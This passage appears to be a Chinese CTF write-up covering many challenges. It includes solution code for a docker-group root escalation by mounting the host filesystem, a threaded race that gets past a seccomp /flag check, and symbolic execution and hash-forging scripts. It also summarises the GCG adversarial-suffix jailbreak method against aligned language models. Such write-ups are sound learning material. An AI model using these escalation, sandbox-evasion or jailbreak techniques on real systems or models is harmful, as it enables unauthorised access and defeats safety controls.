\u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG JSON \u2282 YAML? \u00b6 \u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002 Git? Git! \u00b6 \u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002 HTTP \u96c6\u90ae\u518c \u00b6 \u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Match: \"bfc13a64729c4290ef5b2c2730249c88ca92d82d\"\\r\\n\\r\\n 413 Content Too Large. \u4e0d\u9700\u8981\u771f\u6b63\u8f93\u5165\u5f88\u5927\u7684 payload\uff0c\u628a Content-length \u5f04\u5f97\u5f88\u5927\u5c31\u884c\uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-length: 1145141919810\\r\\n\\r\\n 414 URI Too Long. \u5927\u6982\u9700\u8981\u5f88\u957f\u7684 URI \u8def\u5f84\uff08\u4f46\u662f\u53c8\u4e0d\u80fd\u592a\u957f\uff0c\u5426\u5219 web \u754c\u9762\u672c\u4f53\u4e0d\u4f1a\u5141\u8bb8\u8fd9\u6837\u7684\u54cd\u5e94\uff09\u3002\u5185\u5bb9\u8be6\u89c1 414.txt \u3002 \u4ee5\u4e0a\u5c31\u5df2\u7ecf\u96c6\u6ee1\u4e86 12 \u4e2a\u3002\u5728\u9a8c\u9898\u65f6\u8fd8\u6709\u4e00\u4e2a HTTP code \u6f0f\u4e86\uff1a 501 Not Implemented. \u4ee3\u8868\u670d\u52a1\u5668\u4e0d\u652f\u6301\u6b64\u529f\u80fd\u3002Nginx \u6e90\u4ee3\u7801\u4e2d\u9ed8\u8ba4\u914d\u7f6e\u4e0b\u552f\u4e00\u53ef\u80fd\u89e6\u53d1\u7684\u5730\u65b9\u662f https://github.com/nginx/nginx/blob/a13ed7f5ed5bebdc0b9217ffafb75ab69f835a84/src/http/ngx_http_request.c#L2008 : } else { ngx_log_error ( NGX_LOG_INFO , r -> connection -> log , 0 , \"client sent unknown \\\" Transfer-Encoding \\\" : \\\" %V \\\" \" , & r -> headers_in . transfer_encoding -> value ); ngx_http_finalize_request ( r , NGX_HTTP_NOT_IMPLEMENTED ); return NGX_ERROR ; } else \u4e0a\u9762\u53ea\u5141\u8bb8 chunked \uff0c\u6240\u4ee5\u53ef\u4ee5\uff1a GET / HTTP/1.1\\r\\n Transfer-Encoding: gzip\\r\\n Host: example.com\\r\\n\\r\\n gzip \u6362\u6210\u9664\u4e86 chunked \u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\u4e32\u90fd\u884c\u3002 \u6700\u540e\u4e00\u4e2a\u95ee\u9898\uff1a\u6ca1\u6709\u72b6\u6001\u7801\u662f\u600e\u4e48\u56de\u4e8b\uff1f GET /\\r\\n \u8fd9\u91cc\u5b9e\u9645\u53d1\u9001\u7684\u662f HTTP/0.9 \u8bf7\u6c42\uff0c\u5b83\u53ea\u652f\u6301 GET \uff0c\u7136\u540e\u540e\u9762\u76f4\u63a5\u63a5 URL\uff0c\u6ca1\u6709\u522b\u7684\u3002\u7136\u540e\u54cd\u5e94\u5c31\u76f4\u63a5\u54cd\u5e94\u6587\u4ef6\u5185\u5bb9\uff0c\u4e5f\u6ca1\u6709\u72b6\u6001\u7801\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002 Docker for Everyone \u00b6 \u8fd9\u9898\u8003\u70b9\u5c31\u662fdocker\u7528\u6237\u7ec4\u4e0eroot\u5176\u5b9e\u662f\u7b49\u4ef7\u7684\uff0c\u56e0\u6b64\u76f4\u63a5\u542f\u52a8\u4e00\u4e2a\u5bb9\u5668\u628aflag\u6302\u8f7d\u8fdb\u5bb9\u5668\u5373\u53ef\u5728\u5bb9\u5668\u5185\u8bfb\u53d6\u3002\u53e6\u5916\u6ce8\u610f\u4e00\u4e0b\u8f6f\u8fde\u63a5\u7684\u95ee\u9898\u5373\u53ef\u3002 docker run -it --rm -v /:/outside alpine \u60dc\u5b57\u5982\u91d1 2.0 \u00b6 \u76f4\u63a5\u66b4\u529b\u7a77\u4e3e\u5373\u53ef\uff0c\u5176\u5b9e\u6ee1\u8db3\u6761\u4ef6\u7684\u60c5\u51b5\u5f88\u591a\uff0c\u76f4\u63a5\u8fb9\u8dd1\u8fb9\u8f93\u51fa\u5c31\u5f88\u5feb\u80fd\u62ff\u5230flag\u4e86\u3002 \u89e3\u9898\u4ee3\u7801\uff08\u8fc7\u4e8e\u66b4\u529b\uff09 cod_dict = [] cod_dict += [ 'nymeh1niwemflcir}echaet' ] cod_dict += [ 'a3g7}kidgojernoetlsup?h' ] cod_dict += [ 'ulw!f5soadrhwnrsnstnoeq' ] cod_dict += [ 'ct{l-findiehaai{oveatas' ] cod_dict += [ 'ty9kxborszstguyd?!blm-p' ] def get_cod_dict ( c_dict ): return '' . join ( c_dict ) def decrypt_data ( input_codes ): flags = [] for k in range ( 23 ): print ( k ) for j in range ( 23 ): for t in range ( 23 ): for p in range ( 23 ): for f in range ( 23 ): cd_dict = cod_dict . copy () cd_dict [ 0 ] = cod_dict [ 0 ][: k ] + cod_dict [ 0 ][ k ] + cod_dict [ 0 ][ k :] cd_dict [ 1 ] = cod_dict [ 1 ][: j ] + cod_dict [ 1 ][ j ] + cod_dict [ 1 ][ j :] cd_dict [ 2 ] = cod_dict [ 2 ][: t ] + cod_dict [ 2 ][ t ] + cod_dict [ 2 ][ t :] cd_dict [ 3 ] = cod_dict [ 3 ][: p ] + cod_dict [ 3 ][ p ] + cod_dict [ 3 ][ p :] cd_dict [ 4 ] = cod_dict [ 4 ][: f ] + cod_dict [ 4 ][ f ] + cod_dict [ 4 ][ f :] print ( cd_dict ) st_dict = get_cod_dict ( cd_dict ) output_chars = [ st_dict [ c ] for c in input_codes ] if 'flag{' in '' . join ( output_chars ): flags . append ( '' . join ( output_chars )) return flags flags = decrypt_data ([ 53 , 41 , 85 , 109 , 75 , 1 , 33 , 48 , 77 , 90 , 17 , 118 , 36 , 25 , 13 , 89 , 90 , 3 , 63 , 25 , 31 , 77 , 27 , 60 , 3 , 118 , 24 , 62 , 54 , 61 , 25 , 63 , 77 , 36 , 5 , 32 , 60 , 67 , 113 , 28 ]) print ( set ( flags )) \ud83e\ude90 \u9ad8\u9891\u7387\u661f\u7403 \u00b6 \u9898\u76ee\u4e2d\u7ed9\u7684\u662fasciinema\u5f55\u50cf\u6587\u4ef6\uff0c\u76f4\u63a5 asciinema cat \u5373\u53ef\u5f97\u5230\u5b57\u8282\u6d41\uff0c\u4e0d\u8fc7\u4f1a\u6709\u5f88\u591a\u989d\u5916\u4e0d\u9700\u8981\u7684\u4e1c\u897f\uff0c\u5220\u8d77\u6765\u6bd4\u8f83\u9ebb\u70e6\uff0c\u770b\u5230asciinema\u5f55\u5236\u7684\u65f6\u5019\u6709raw\u9009\u9879\uff0c\u4e8e\u662f\u91cd\u65b0\u5f55\u4e86\u4e00\u904d\uff0c\u8fd9\u6837\u5b57\u8282\u6d41\u5c31\u5e72\u51c0\u5f88\u591a\uff0c\u7a0d\u5fae\u6539\u4e00\u4e0b\uff0c\u8fd0\u884c\u5373\u53ef\u3002 \ud83e\ude90 \u5c0f\u578b\u5927\u8bed\u8a00\u6a21\u578b\u661f\u7403 \u00b6 \u5f88\u65b0\u9896\u7684AI\u9898\u76ee\uff0c\u5bf9\u4e8e\u6211\u6765\u8bf4\u53ea\u80fd\u4e71\u8bd5\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u7528repeat\u5927\u6cd5\u5c31\u53ef\u5b8c\u6210\u3002 \u7b2c\u4e8c\u95ee\u5176\u5b9e\u601d\u8def\u5bf9\u7684\uff0c\u4e0d\u8fc7\u6211\u5acc\u9ebb\u70e6\uff0c\u6ca1\u6709\u53bb\u7a77\u4e3ehhh\u3002 \u540e\u9762\u4e24\u95ee\u786e\u5b9e\u53ef\u4ee5\u7684\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 LLM Attacks \u00b6 \u8bba\u6587\uff1a Universal and Transferable Adversarial Attacks on Aligned Language Models Background \u00b6 \u4e00\u4e2a Decoder-Only \u7684 LLM \u5c06\u4e00\u4e32 token \\(x_{1:n}\\) \u6620\u5c04\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u3002\u8bed\u8a00\u6a21\u578b\u6240\u9700\u8981\u5b66\u4e60\u7684\u5219\u662f\u5728\u7ed9\u5b9a\u4e4b\u524d\u7684 token \\(x_{1:n}\\) \uff0c\u5f97\u5230\u4e0b\u4e00\u4e2a token \\(x_{n+1}\\) \u7684\u6982\u7387 \\(p(x_{n+1} | x_{1:n})\\) \u3002\u5176\u4e2d\u6bcf\u4e00\u4e2a \\(x_i \\in {1, ... V}\\) \u90fd\u662f\u8bcd\u8868\u4e2d\u7684\u4e00\u4e2a token\u3002\u5982\u679c\u60f3\u8981\u8ba9\u6a21\u578b\u8f93\u5165\u4e00\u6bb5\u5e8f\u5217\uff0c\u5e8f\u5217\u4e2d\u6bcf\u4e00\u4e2a token \u90fd\u53ea\u4e0e\u4e4b\u524d\u7684\u6240\u6709 token \u6709\u5173\uff0c\u56e0\u6b64\u6a21\u578b\u8f93\u51fa\u4e00\u6bb5\u5e8f\u5217 \\(x_{n+1:n+H}\\) \u7684\u6982\u7387\u4e3a \\[p(x_{n+1:n+H}|x_{1:n}) = \\prod_{i=1}^H p(x_{n+i} | x_{1:n+i-1})\\] Method \u00b6 \u5982\u679c\u6211\u4eec\u5e0c\u671b\u6a21\u578b\u80fd\u591f\u8f93\u51fa\u4e00\u4e2a\u6307\u5b9a\u7684\u5e8f\u5217\uff0c\u5c31\u662f\u5e0c\u671b \\(p(x_{n+1:n+H}|x_{1:n})\\) \u5c3d\u53ef\u80fd\u9ad8\uff0c\u4ee5\u6b64\u51fa\u53d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u4f18\u5316\u76ee\u6807 \\[\\mathcal{L}(x_{1:n}) = -\\log p(x^\\star_{n+1:n+H} | x_{1:n})\\] \u4f46\u662f\u4e0e\u5e38\u89c1\u7684\u56fe\u7247\u4e0a\u9762\u7684\u5bf9\u6297\u6837\u672c\u653b\u51fb\u4e0d\u540c\uff0cLLM \u7684\u8f93\u5165\u662f\u76f8\u5bf9\u79bb\u6563\u7684 token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980 \ud83e\ude90 \u6d41\u5f0f\u661f\u7403 \u00b6 \u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 \u89e3\u9898\u4ee3\u7801 import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" ) \ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403 \u00b6 \u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002 Komm, s\u00fcsser Flagge \u00b6 \u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002 \u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21 \u00b6 \u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; } \u5f02\u661f\u6b67\u9014 \u00b6 \u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86 \u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0 \u00b6 \u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002 \u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5 \u00b6 \u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" ) O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf \u00b6 \u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com 